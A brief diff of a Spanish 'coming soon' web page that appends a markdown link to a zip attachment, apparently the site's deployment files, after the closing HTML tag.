@@ -9,3 +9,4 @@
 <p>Próximamente nuestra página oficial.</p>
 </body>
 </html>
+[copaycristal-web-vercel.zip](https://github.com/user-attachments/files/25919118/copaycristal-web-vercel.zip)
